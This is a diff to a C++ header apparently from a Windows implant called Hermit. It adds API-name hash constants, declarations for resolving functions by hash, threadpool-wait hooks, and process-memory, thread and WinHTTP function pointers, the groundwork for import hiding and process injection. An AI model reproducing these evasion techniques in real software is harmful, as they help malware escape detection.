@@ -2,12 +2,66 @@
 #define HERMIT_CORE_PROCS_HPP
 
 #include "core/ntdll.hpp"
+#include "core/stdout.hpp"
 #include "core/syscalls.hpp"
 
 #include <winternl.h>
 #include <windows.h>
 #include <winhttp.h>
 #include <string>
+#include <cstring>
+
+#define APIHASH_NTCREATEPROCESSEX           0xbd003d8b
+#define APIHASH_NTOPENPROCESS               0x64e24f6a
+#define APIHASH_NTOPENPROCESSTOKEN          0xcdd9f7af
+#define APIHASH_NTTERMINATEPROCESS          0xc58a7b49
+#define APIHASH_NTQUERYINFORMATIONPROCESS   0xa79c59b0
+#define APIHASH_NTSETINFORMATIONPROCESS     0xb5d02d0a
+#define APIHASH_NTCREATETHREADEX            0x2afc9934
+#define APIHASH_NTOPENTHREAD                0xa58f60af
+#define APIHASH_NTRESUMETHREAD              0x8bad8d92
+#define APIHASH_NTGETCONTEXTTHREAD          0x904d345e
+#define APIHASH_NTSETCONTEXTTHREAD          0x25df9cd2
+#define APIHASH_NTALLOCATEVIRTUALMEMORYEX   0x28af7fe7
+#define APIHASH_NTREADVIRTUALMEMORY         0x88bc3b5b
+#define APIHASH_NTWRITEVIRTUALMEMORY        0x7c61e008
+#define APIHASH_NTPROTECTVIRTUALMEMORY      0xa7df2bd8
+#define APIHASH_NTFREEVIRTUALMEMORY         0xb6eb4645
+#define APIHASH_NTDUPLICATEOBJECT           0xae23334f
+#define APIHASH_NTWAITFORSINGLEOBJECT       0x73c87a00
+#define APIHASH_NTCLOSE                     0x6f18e5dd
+#define APIHASH_NTCREATEFILE                0x2f4d94d3
+#define APIHASH_NTREADFILE                  0xc363b2ad
+#define APIHASH_NTWRITEFILE                 0x9339e2e0
+#define APIHASH_NTCREATENAMEDPIPEFILE       0x333974ac
+#define APIHASH_NTQUERYINFORMATIONFILE      0x6226c85b
+#define APIHASH_NTSETINFORMATIONFILE        0x52a8041
+#define APIHASH_NTUNMAPVIEWOFSECTION        0x574e9fc1
+#define APIHASH_RTLALLOCATEHEAP             0xcc7755e
+#define APIHASH_RTLZEROMEMORY               0x899c0d1e
+#define APIHASH_RTLINITUNICODESTRING        0x4dc9caa9
+#define APIHASH_RTLSTRINGCATW               0x333f6b47
+#define APIHASH_RTLSTRINGCCHCOPYW           0x32231e60
+#define APIHASH_RTLSTRINGCCHLENGTHW         0x28821d8f
+#define APIHASH_RTLQUERYSYSTEMINFORMATION   0xf6044a6a
+#define APIHASH_RTLEXPANDENVIRONMENTSTRINGS 0xb73f443e
+#define APIHASH_RTLGETFULLPATHNAME_U        0x2116c216
+#define APIHASH_CREATETHREADPOOLWAIT        0x7a8370ac
+#define APIHASH_SETTHREADPOOLWAIT           0x5f2a3808
+#define APIHASH_WINHTTPOPEN                 0x97451379
+#define APIHASH_WINHTTPCONNECT              0xe18b30db
+#define APIHASH_WINHTTPOPENREQUEST          0xd6cffcd6
+#define APIHASH_WINHTTPSETOPTION            0x48ed79a8
+#define APIHASH_WINHTTPSENDREQUEST          0x79792358
+#define APIHASH_WINHTTPWRITEDATA            0xeed55fda
+#define APIHASH_WINHTTPRECEIVERESPONSE      0x66131eb5
+#define APIHASH_WINHTTPQUERYHEADERS         0xe17c65cd
+#define APIHASH_WINHTTPQUERYDATAAVAILABLE   0xff301fc6
+#define APIHASH_WINHTTPREADDATA             0x70389c8f
+#define APIHASH_WINHTTPCLOSEHANDLE          0x22081731
+
+#define HASH_IV     0x35
+#define RANDOM_ADDR 0xab10f29f
 
 typedef struct _PS_ATTRIBUTE
 {
@@ -106,6 +160,10 @@ namespace Procs
     typedef NTSTATUS (NTAPI* LPPROC_RTLGETFULLPATHNAME_U)(PCWSTR FileName, ULONG BufferLength, PWSTR Buffer, PWSTR *FilePart);
 
     // **WINAPIs**
+    // CreateThreadpoolWait
+    typedef PTP_WAIT    (WINAPI* LPPROC_CREATETHREADPOOLWAIT)(PTP_WAIT_CALLBACK pfnwa, PVOID pv, PTP_CALLBACK_ENVIRON pcbe);
+    // SetThreadpoolWait
+    typedef VOID        (WINAPI* LPPROC_SETTHREADPOOLWAIT)(PTP_WAIT pwa, HANDLE h, PFILETIME pftTimeout);
     // WinHttpOpen
     typedef HINTERNET   (WINAPI* LPPROC_WINHTTPOPEN)(LPCWSTR pszAgentW, DWORD dwAccessType, LPCWSTR pszProxyW, LPCWSTR pszProxyBypassW, DWORD dwFlags);
     // WinHttpConnect
@@ -131,7 +189,7 @@ namespace Procs
 
     struct PROCS
     {
-         // **NATIVE APIs**
+        // **NATIVE APIs**
         LPPROC_NTCREATEPROCESSEX            lpNtCreateProcessEx                 = nullptr;
         LPPROC_NTOPENPROCESS                lpNtOpenProcess                     = nullptr;
         LPPROC_NTOPENPROCESSTOKEN           lpNtOpenProcessToken                = nullptr;
@@ -168,10 +226,11 @@ namespace Procs
         LPPROC_RTLSTRINGCCHLENGTHW          lpRtlStringCchLengthW               = nullptr;
         LPPROC_RTLQUERYSYSTEMINFORMATION    lpRtlQuerySystemInformation         = nullptr;
         LPPROC_RTLEXPANDENVIRONMENTSTRINGS  lpRtlExpandEnvironmentStrings       = nullptr;
-        LPPROC_RTLNTSTATUSTODOSERROR        lpRtlNtStatusToDosError             = nullptr;
         LPPROC_RTLGETFULLPATHNAME_U         lpRtlGetFullPathName_U              = nullptr;
 
         // **WINAPIs**
+        LPPROC_CREATETHREADPOOLWAIT         lpCreateThreadpoolWait              = nullptr;
+        LPPROC_SETTHREADPOOLWAIT            lpSetThreadpoolWait                 = nullptr;
         LPPROC_WINHTTPOPEN                  lpWinHttpOpen                       = nullptr;
         LPPROC_WINHTTPCONNECT               lpWinHttpConnect                    = nullptr;
         LPPROC_WINHTTPOPENREQUEST           lpWinHttpOpenRequest                = nullptr;
@@ -215,7 +274,17 @@ namespace Procs
 
     typedef PROCS* PPROCS;
 
-    PPROCS FindProcs(HMODULE hNTDLL, HMODULE hWinHTTPDLL, BOOL bIndirectSyscalls);
+    DWORD GetHashFromString(char* str);
+    PVOID GetProcAddressByHash(
+        HMODULE hModule,
+        DWORD   dwHash
+    );
+    PPROCS FindProcs(
+        HMODULE hNTDLL,
+        HMODULE hKernel32DLL,
+        HMODULE hWinHTTPDLL,
+        BOOL    bIndirectSyscalls
+    );
 }
 
 #endif // HERMIT_CORE_PROCS_HPP
